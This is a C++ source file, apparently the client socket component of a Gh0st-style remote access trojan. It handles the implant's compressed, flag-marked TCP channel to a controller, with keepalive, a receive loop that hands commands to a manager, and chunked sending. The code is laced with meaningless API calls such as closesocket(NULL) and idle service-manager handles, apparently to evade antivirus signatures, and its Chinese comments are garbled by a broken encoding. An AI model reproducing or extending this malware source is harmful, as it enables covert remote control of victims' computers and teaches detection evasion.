// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "common/KeyboardManager.h"
#include "ClientSocket.h"
#include "zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "common/Manager.h"
#include "common/until.h"
#pragma comment(lib, "ws2_32.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#pragma comment(lib,"zlib")

CClientSocket::CClientSocket()
{
	
	GetForegroundWindow();
	
	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
	bSendLogin = true;
	closesocket(NULL);

	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	bSendLogin = true;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = {'F', 'K', 'J', 'P', '3'};

	closesocket(NULL);

	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}

CClientSocket::~CClientSocket()
{
	
	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );

	m_bIsRunning = false;
	bSendLogin = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	CloseServiceHandle(hSCM);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	
	closesocket(NULL);
	
	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
	
	closesocket(NULL);
	
}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	
	closesocket(NULL);

	__try
	{
		StartService(NULL,NULL,NULL);
	}
	__finally
	{
		__asm nop;
		// һ��Ҫ���һ�£���Ȼsocket��ľ�ϵͳ��Դ
		Disconnect();
	}
	// �����¼�����

	closesocket(NULL);
	
	ResetEvent(m_hEvent);
	m_bIsRunning = false;
	bSendLogin = false;
	
	closesocket(NULL);
	
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 

	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}

	hostent* pHostent = NULL;

	pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;
	
	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;

	ClientAddr.sin_port	= htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return false;
// ����Nagle�㷨�󣬶Գ���Ч��������Ӱ��
// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
//   const char chOpt = 1;
// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

	// ��֤socks5������
//	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
//	{
//		return false;
//	}
	// ���ñ�����ƣ��Լ�������ʵ��
	
	
	closesocket(NULL);
	
	const char chOpt = 1; // True
	// Set KeepAlive �����������, ��ֹ����˲���������
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// ���ó�ʱ��ϸ��Ϣ
		tcp_keepalive	klive;
		klive.onoff = 1; // ���ñ���
		klive.keepalivetime = 1000 * 30;//60 * 3; // 3���ӳ�ʱ Keep Alive
		klive.keepaliveinterval = 1000 * 5; // ���Լ��Ϊ5�� Resend if No-Reply
		WSAIoctl
			(
			m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
			);
	}

	
	closesocket(NULL);
	
	m_bIsRunning = true;
	bSendLogin = true;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	
	closesocket(NULL);
	
	return true;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{
	
	closesocket(NULL);
	
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	
	closesocket(NULL);
	
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);
		}
	}

	return -1;
}

void CClientSocket::run_event_loop()
{
	
	closesocket(NULL);
	
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	
	closesocket(NULL);
	
	return m_bIsRunning;
}

void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	
	closesocket(NULL);
	
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();
			return;
		}
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// ���·���	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);

		
		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag));
			
			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
			

			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				PBYTE pData = new BYTE[nCompressLength];
				PBYTE pDeCompressionData = new BYTE[nUnCompressLength];
				


				m_CompressionBuffer.Read(pData, nCompressLength);
				
				//////////////////////////////////////////////////////////////////////////
				unsigned long	destLen = nUnCompressLength;
				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				//////////////////////////////////////////////////////////////////////////
				if (nRet == Z_OK)
				{
					m_DeCompressionBuffer.ClearBuffer();
					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}


				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}catch(...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
	
	closesocket(NULL);

}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;

	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
	TCHAR szModule [MAX_PATH];
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	CancelIo((HANDLE) m_Socket);
	CloseServiceHandle(hSCM);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	InterlockedExchange((LPLONG)&bSendLogin, false);

	
	CKeyboardManager::Myclosesocket(m_Socket);
	

	SetEvent(m_hEvent);
	
	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{	
	closesocket(NULL);
	
	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001  + 12;
		GetTickCount();
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		int	nRet = compress(pDest, &destLen, lpData, nSize);
		
		if (nRet != Z_OK)
		{
			delete [] pDest;
			return -1;
		}
		
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete [] pDest;
		
		// ��������ٱ�������, ��Ϊ�п�����m_ResendWriteBuffer�����ڷ���,���Բ�ֱ��д��
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		
		GetForegroundWindow();
		
		CopyMemory(lpResendWriteBuffer, lpData, nSize);

		GetForegroundWindow();

		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// ���ݷ��͵�����
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // Ҫ���ط�, ֻ����FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ���ݷ��͵�����	
	}

	// �ֿ鷢��
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// ���η���
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		int i;
		for ( i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // ��Ҫ��Sleep,�����������ƶ����ݻ���
	}
	// �������Ĳ���
	if (size > 0)
	{
		int i;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::setManagerCallBack( CManager *pManager )
{
	
	closesocket(NULL);
	
	m_pManager = pManager;
}
